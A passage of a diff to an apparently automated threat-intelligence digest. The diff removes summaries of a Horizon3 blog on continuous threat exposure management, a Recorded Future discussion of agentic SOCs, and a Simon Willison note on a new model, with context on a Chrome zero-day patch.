-CTEM Is Not About the Stages. It’s About the Outcome. Stephen Gates September 2, 2026 Blogs Continuous Threat Exposure Management (CTEM) has a five-stage framework. That does not mean you need five technologies. Yet much of the conversation around CTEM is heading in that direction. Vendors and practitioners increasingly try to map technologies to each stage, assigning products to Scoping, Discovery, Prioritization, and Validation, while treating Mobilization as a problem for workflow and orchestration. Before long, CTEM starts looking like an architecture diagram with five boxes that security teams are expected to fill. That misses the point. CTEM is ultimately about one outcome: continuously reducing exposure. The stages help organize the program. They are not the outcome. The Framework Is Not a Technology Architecture Gartner® defines CTEM through these five stages: Scoping → Discovery → Prioritization → Validation → Mobilization Look at the bookends: Scoping and Mobilization. Scoping starts with organizational decisions about what matters to the business, what should be in scope, and which systems, processes, identities, applications, and potential impacts deserve attention. Mobilization is about getting people to act. Security can provide evidence, guidance, and recommendations, but someone still has to own the problem, decide what to do, implement the change, and manage the operational consequences. Technology supports both, but neither is simply a technology problem. The question isn’t whether you have technology mapped to every CTEM stage. The question is: Are we continuously reducing the exposures attackers can use against us? That changes how you think about the entire program. More Visibility Isn’t the Same as Less Exposure Most organizations already have vulnerability scanners, EASM, CSPM, threat intelligence, risk scoring, identity tooling, endpoint controls, ticketing systems, and remediation workflows generating enormous amounts of information about exposure. The problem is turning that information into action. Discovery illustrates the challenge. A mature security program can identify enormous numbers of vulnerabilities, misconfigurations, exposed assets, identity risks, and other potential weaknesses. You need that coverage to understand where exposure might exist, but more visibility does not automatically create more understanding. A vulnerability can have a critical severity score and still be difficult or impossible to exploit in a particular environment. Another issue that appears relatively unimportant on its own may become consequential when combined with a weak credential, excessive privilege, a misconfiguration, or another weakness. Visibility tells you what could be a problem. It doesn’t tell you what an attacker can actually do. That’s why exposure management can’t stop at discovery. Validation Changes the Conversation Security teams have spent years trying to improve prioritization with better signals, including severity scores, threat intelligence, asset criticality, Known Exploited Vulnerabilities, exploit prediction, and business context. These signals are valuable because they help teams decide where to focus. But they are still signals. Validation adds evidence. Can the weakness actually be exploited in your environment? Can multiple weaknesses be chained together? Can an attacker move laterally or escalate privileges? Can they reach sensitive systems or data? Do the controls expected to stop the attack actually work? Once you know those answers, prioritization becomes less subjective. You’re no longer deciding solely on what might create risk. You have evidence showing what an attacker can actually achieve. The backlog can shrink accordingly, allowing teams to focus on validated exposures based on the criticality of affected systems, access gained, ability to move laterally, and potential impact to data, operations, or customers. Validation turns exposure data into evidence for action. Finding
-```
-
-#### Corroborating sources (1)
-
-- **Horizon3 Attack Research** (offensive_vulnerability_research)
-  - Title: CTEM Is Not About the Stages. It’s About the Outcome.
-  - Published: 2026-09-02T13:11:00+00:00
-  - Link: https://horizon3.ai/intelligence/blogs/ctem-outcome-not-stages/
-  - Summary: CTEM is not about filling five technology boxes. It is about continuously reducing exploitable exposure, proving remediation worked, and measuring whether the environment is becoming harder to attack.
-
-### Cluster 8f89f1c57c — score 10
-
-- Title: The Agentic SOC – From AI Theater to Real Defense
-- Source: Recorded Future (threat_research_primary)
-- Published: 2026-09-01T00:00:00+00:00
-- Link: https://www.recordedfuture.com/blog/agentic-soc-real-defense
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: ai_security
-- affected_industries: legal_professional
-- content_type: news_report
-- confidence_tier: tier_1_primary_research
-
-#### Primary article taxonomy
-- threat_categories: ai_security
-- affected_industries: legal_professional
-- content_type: news_report
-- confidence_tier: tier_1_primary_research
-
-#### Summary
-
-```
-Experts from Recorded Future and Accenture offer perspectives on navigating the path to becoming an agentic SOC. Find out how to plan moving beyond “AI theater” by prioritizing measurable KPIs, proactively mitigating autonomous security risks, and evolving the analyst’s role from managing alerts to managing agents.
-```
-
-#### Full body
-
-```
-The Agentic SOC – From AI Theater to Real Defense Moving beyond "AI theater" with measurable KPIs: Security teams must distinguish between genuine value and "productivity theater." Success requires defining concrete KPIs—such as cost improvement, risk reduction, and speed—to measure true ROI, rather than deploying AI tools without a clear strategic purpose. Mitigate new autonomous risks: The shift to an agentic SOC introduces distinct threats, such as indirect prompt injection, and creates visibility gaps that traditional SIEM platforms are not built to handle. Organizations should shift from post-event observability to proactive control mechanisms, such as placing strict constraints on agent compute and communication. Redefine the analyst’s role for speed at scale: As defensive timelines compress from days to seconds, the fundamental unit of work will evolve from alert handling to agent management. The human role is shifting from a manual processor to an architect, responsible for setting objectives, defining operational constraints, and overseeing the behavior of AI agents. For security teams, AI has generated both more excitement and more confusion than any technology in the last decade. As threat actors experiment with AI to hone their attacks, defenders are trying to determine which AI investments will help them measurably reduce risk. Matthew Farmer, Accenture’s Managing Director of Security Operations in EMEA, joined Recorded Future’s co-founder Christopher Ahlberg and CTO and co-founder Staffan Truvé in a recent discussion to discuss the agentic SOC and what it takes to move from “AI theater” to real defense. Read on to see the key highlights from the discussion. Avoiding the "productivity theater" trap While AI is demonstrably transforming investigation and decision-making layers in SecOps, there’s a significant risk that organizations are falling into what Farmer calls "AI productivity theater." "We can all agree that there's great production value around a lot of AI capabilities and AI products," he said. "But there are also organizations that are really struggling to achieve any kind of return on investment on their AI.” The panel noted that the difference between success and failure doesn’t necessarily have anything to do with being in a regulated or non-regulated industry. It’s more about the ability to move past the theater by defining concrete KPIs. “A lot of what people want to achieve with AI, we can already achieve with existing machine learning or SOAR automation capabilities,” Farmer said. So rather than simply deploying an AI solution for the sake of being AI-enabled, organizations need to ask whether they’re solving for cost improvement, risk reduction, or speed. They need to understand their KPIs so they can measure their true ROI. Navigating technical and operational challenges When it comes to bringing new AI solutions online, the panel noted that SOCs often face administrative, legal, and compliance limitations that eclipse any technical hurdles. They also agreed that data quality and lack of context — “two sides of the same coin” according to Truvé — remain fundamental challenges. Farmer noted that, “In the new world of tokenomics, it costs just as much money to troll through poor quality data as high-quality data.” It’s essential that security organizations feed only the best intelligence into their AI tools. Assessing new risks, from democratization to agentic threats Farmer said that security organizations used to ask a key question: “Do those [threat actors] with the capability have the motive, and do those with the motive have the capability?” We’re now in a world where non-capable threat actors can use AI to capably launch highly sophisticated attacks. Threats are also becoming more structural. The panel highlighted "indirect prompt injection"—where agents are manipulated by the very instructions they read—as a new, distinct threat vector. As companies deploy a digital workforce of AI agents,
-```
-
-#### Corroborating sources (1)
-
-- **Recorded Future** (threat_research_primary)
-  - Title: The Agentic SOC – From AI Theater to Real Defense
-  - Published: 2026-09-01T00:00:00+00:00
-  - Link: https://www.recordedfuture.com/blog/agentic-soc-real-defense
-  - Summary: Experts from Recorded Future and Accenture offer perspectives on navigating the path to becoming an agentic SOC. Find out how to plan moving beyond “AI theater” by prioritizing measurable KPIs, proactively mitigating autonomous security risks, and evolving the analyst’s role from managing alerts to managing agents.
 
 ### Cluster bb1555be83 — score 10
 
@@ -4100,39 +4093,6 @@ Google’s Chrome 152 security update resolves 12 vulnerabilities, including a h
   - Published: 2026-09-04T11:31:52+00:00
   - Link: https://www.securityweek.com/google-patches-6th-chrome-zero-day-of-2026/
   - Summary: Google’s Chrome 152 security update resolves 12 vulnerabilities, including a high-severity type confusion flaw in the V8 engine. The post Google Patches 6th Chrome Zero-Day of 2026 appeared first on SecurityWeek .
-
-### Cluster 31b8eaa245 — score 8
-
-- Title: Introducing GPT-6 Astra for developers
-- Source: Simon Willison (ai_security_agentic_risk)
-- Published: 2026-09-05T23:27:48+00:00
-- Link: https://simonwillison.net/2026/Sep/5/introducing-gpt-6-astra-for-developers/
-- Fetch status: not_attempted
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- content_type: news_report
-- confidence_tier: tier_2_operator
-
-#### Primary article taxonomy
-- content_type: news_report
-- confidence_tier: tier_2_operator
-
-#### Summary
-
-```
-Introducing GPT-6 Astra for developers Blink and you'll miss it, but there's a familiar creature at 1m59s : Across the board, Astra has more attention to detail, better understanding of the user's prompt, and can build more sophisticated outputs. In particular, it excels at building 3D models. I've seen it make incredible renderings of gardens, shipyards, animals , cityscapes, even Dyson spheres. Astra really does believe in putting a red neckerchief on a pelican riding a bicycle. Via Hacker News comment Tags: ai , openai , generative-ai , llms , pelican-riding-a-bicycle , gpt-6-astra
-```
-
-#### Corroborating sources (1)
-
-- **Simon Willison** (ai_security_agentic_risk)
-  - Title: Introducing GPT-6 Astra for developers
-  - Published: 2026-09-05T23:27:48+00:00
-  - Link: https://simonwillison.net/2026/Sep/5/introducing-gpt-6-astra-for-developers/
-  - Summary: Introducing GPT-6 Astra for developers Blink and you'll miss it, but there's a familiar creature at 1m59s : Across the board, Astra has more attention to detail, better understanding of the user's prompt, and can build more sophisticated outputs. In particular, it excels at building 3D models. I've seen it make incredible renderings of gardens, shipyards, animals , cityscapes, even Dyson spheres. Astra really does believe in putting a red neckerchief on a pelican riding a bicycle. Via Hacker News comment Tags: ai , openai , generative-ai , llms , pelican-riding-a-bicycle , gpt-6-astra
 
 ### Cluster fb837e9843 — score 8
 
